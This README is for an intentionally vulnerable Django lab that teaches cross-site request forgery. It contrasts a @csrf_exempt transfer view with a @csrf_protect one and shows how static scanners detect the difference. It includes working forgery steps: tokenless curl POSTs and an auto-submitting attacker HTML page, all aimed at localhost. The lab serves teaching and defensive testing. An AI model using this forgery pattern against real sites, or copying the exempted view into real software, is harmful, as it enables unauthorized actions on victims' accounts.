# Lab 08 — Cross-Site Request Forgery (CSRF)

Companion lab for the blog post
**[Cross-Site Request Forgery (CSRF)](https://thiagoteixeira.tech/blog/)** (Series II).

| | |
|---|---|
| **OWASP** | A01:2025 — Broken Access Control |
| **CWE** | CWE-352 — Cross-Site Request Forgery |
| **ASVS** | 4.0.3 V4.2.2 — verify anti-CSRF defences on state-changing operations |
| **Detection** | SAST — the curated packs **miss** `@csrf_exempt`; Semgrep's own **audit-tier** rule catches it (no custom rule needed), asserted in CI (see Scanning it) |

> ⚠️ Intentionally vulnerable. Run locally / in the provided Docker stack only. See [SECURITY.md](../../SECURITY.md).

## The two views

| View | File | What it does |
|---|---|---|
| Vulnerable | [`views_vulnerable.py`](views_vulnerable.py) | `@csrf_exempt` transfer — a tokenless (forged) POST is accepted |
| Secure | [`views_secure.py`](views_secure.py) | `@csrf_protect` transfer — a POST without a valid token gets `403` |

Both move the logged-in user's `holdings` to a named recipient. The flag is
seeded into **alice's** account (the victim); a forged, tokenless POST transfers
it to **bob** (the attacker). A successful forgery is visible in the database —
the flag *moves* — not merely in a status code.

**A note on this repo's CSRF wiring.** In a default Django project
`CsrfViewMiddleware` is global and every view is protected; the vulnerability is
`@csrf_exempt` *removing* it. To keep the other command-line labs token-free,
this repo runs **without** the global middleware, so here the secure view opts
into protection with `@csrf_protect` and the vulnerable view's `@csrf_exempt` is
the *named* pattern (illustrative — the view is unprotected either way). The
security lesson is identical: a token the attacker cannot forge.

## Run it

From the repository root (the folder with `docker-compose.yml`):

```bash
docker compose up -d          # Postgres + Django on http://127.0.0.1:8000 (background)
```

The seed creates `alice` (victim, holds the flag) and `bob` (attacker, empty).
On Windows PowerShell, `curl` is an alias for `Invoke-WebRequest` — use
`curl.exe`, or Git Bash.

## Test the pair from the command line

A tokenless POST carrying the victim's session cookie is exactly the shape a
cross-site forgery produces — so `curl` reproduces the server side directly.

**1. Log in as `alice` (the victim)** and confirm she holds the flag:

```bash
curl -s -c jar.txt -d 'username=alice&password=labpass' http://127.0.0.1:8000/accounts/login/
curl -s -b jar.txt http://127.0.0.1:8000/csrf/account/ | grep -o 'FLAG{[^}]*}'
# FLAG{csrf_via_csrf_exempt_state_change}
```

**2. Forge the transfer** — a tokenless POST to the vulnerable view moves her
flag to `bob`:

```bash
curl -s -b jar.txt -d 'to_account=bob' http://127.0.0.1:8000/csrf/vulnerable/transfer/
# ... moved FLAG{...} from alice to bob
```

**3. The attacker collects it** — log in as `bob` and read his account:

```bash
curl -s -c jarb.txt -d 'username=bob&password=labpass' http://127.0.0.1:8000/accounts/login/
curl -s -b jarb.txt http://127.0.0.1:8000/csrf/account/ | grep -o 'FLAG{[^}]*}'
# FLAG{csrf_via_csrf_exempt_state_change}   ← captured
```

**4. The fix** — the same tokenless POST against the secure view is rejected:

```bash
curl -s -b jar.txt -o /dev/null -w '%{http_code}\n' -d 'to_account=bob' http://127.0.0.1:8000/csrf/secure/transfer/
# 403
```

Or prove all of it in one command (from the repo root):

```bash
docker compose run --rm web python manage.py test labs.post_08_csrf
```

## The browser walkthrough (the real cross-site demo)

`curl` shows the server side; to see the *cross-site* mechanic you need two
pages in an empty folder. `/accounts/login/` takes only a POST (it has no form),
so the first one logs the browser in. Save it as `login.html`:

```html
<!-- login.html — logs this browser in as alice (the victim) -->
<form action="http://127.0.0.1:8000/accounts/login/" method="POST">
  <input name="username" value="alice">
  <input name="password" value="labpass">
  <button type="submit">Log in as alice</button>
</form>
```

and save the attacker's page beside it as `evil.html`:

```html
<!-- evil.html — the attacker's auto-submitting page -->
<body onload="document.getElementById('f').submit()">
  <form id="f" action="http://127.0.0.1:8000/csrf/vulnerable/transfer/" method="POST">
    <input type="hidden" name="to_account" value="bob">
  </form>
</body>
```

Serve the folder from the same host on another port, log in, then open the
attacker's page:

```bash
python -m http.server 8001 --bind 127.0.0.1    # in the folder holding both pages
# open http://127.0.0.1:8001/login.html and click the button ("logged in as alice")
# then open http://127.0.0.1:8001/evil.html
```

The page submits on load; the browser attaches alice's session cookie
automatically; the vulnerable endpoint accepts it and the flag moves — the victim
sees nothing. Point the same form at `/csrf/secure/transfer/` and it gets a `403`.

> **SameSite caveat (read this).** Django's `sessionid`/`csrftoken` cookies
> default to `SameSite=Lax`, which a browser withholds from a cross-site POST.
> Port 8001 is a different *origin* from 8000 but the same *site* (scheme plus
> host; the port does not count), so the cookie still rides along. Open
> `evil.html` straight from disk (`file://`) or from `http://localhost:8001/`
> instead and the page is cross-site: the POST arrives without a session and
> `@login_required` redirects it to the login page, so nothing moves. A headless
> Chrome 155 run against a stand-in for this view showed all three outcomes,
> logging in through a `login.html` first: transcript, stand-in and pages are in
> [`scans/samesite-browser.txt`](scans/samesite-browser.txt). That is SameSite
> doing its job, defence in depth rather than a lab defect. The server-side lesson (the secure view rejects the tokenless POST with
> `403`) holds regardless, which is why `tests.py` uses
> `Client(enforce_csrf_checks=True)` to prove it deterministically.

## The fix

Leave `CsrfViewMiddleware` in place (it is on by default in real projects); put
`{% csrf_token %}` in every POST form; never `@csrf_exempt` a state-changing
view; never perform state changes on GET. Here the secure view demonstrates the
enforcement explicitly:

```python
from django.views.decorators.csrf import csrf_protect

@csrf_protect      # a POST without a valid token gets 403
def transfer(request):
    ...
```

## Isolation

This lab teaches CSRF and nothing else. The recipient is validated and must
differ from the sender, so it does not drift into IDOR (Post 6); no raw SQL;
output escaped. Global CSRF is deliberately off in this repo (see the note
above), which is why the contrast is drawn with `@csrf_protect`.

## Scanning it

The standard SAST tools an analyst runs by default **miss** this. Bandit has no
`@csrf_exempt` check (only a `B106` false alarm on the test password). Semgrep's
curated packs (`p/django`, `p/python`, `p/owasp-top-ten`) report **0 on both
views** — but the rule *exists*, in the **audit tier**, which none of the three
packs includes (`p/security-audit` does):

```bash
# curated packs — miss it
bandit -r labs/post_08_csrf/
semgrep scan --config p/django --config p/python --config p/owasp-top-ten labs/post_08_csrf/

# Semgrep's own audit-tier rule — catches it, and distinguishes the pair
semgrep scan --config r/python.django.security.audit.csrf-exempt labs/post_08_csrf/views_vulnerable.py  # 1 finding (@csrf_exempt)
semgrep scan --config r/python.django.security.audit.csrf-exempt labs/post_08_csrf/views_secure.py      # 0 findings (@csrf_protect)
```

The rule matches `@csrf_exempt` only as a decorator on a function:
`@method_decorator(csrf_exempt, ...)` on a class-based view and
`csrf_exempt(view)` in a `urls.py` pass it silently (checked with Semgrep
1.170.0, Oct 23, 2026), so `grep -rn csrf_exempt` stays the first check.

So there is **no custom rule** here — Semgrep already ships one
(`python.django.security.audit.csrf-exempt.no-csrf-exempt`); the lesson is
**audit-tier awareness**: security-relevant rules can sit in a tier a default
scan skips. CI asserts that audit rule fires on the vulnerable view and is silent
on the secure one. The captured runs are under [`scans/`](scans/); full reasoning
(including the DAST/SameSite note) is in [`scans/README.md`](scans/README.md).

Bandit and Semgrep are pinned but **not bundled in the lab image** (same as CI).
Install them on the host — `pip install bandit==1.9.4 semgrep==1.170.0` — and run
them there. The `web` container is network-isolated for tier-3 containment (see
[SECURITY.md](../../SECURITY.md)), so it cannot `pip install` a scanner; the host
is the right place anyway, since SAST reads the source files directly. All
commands run from the repository root.
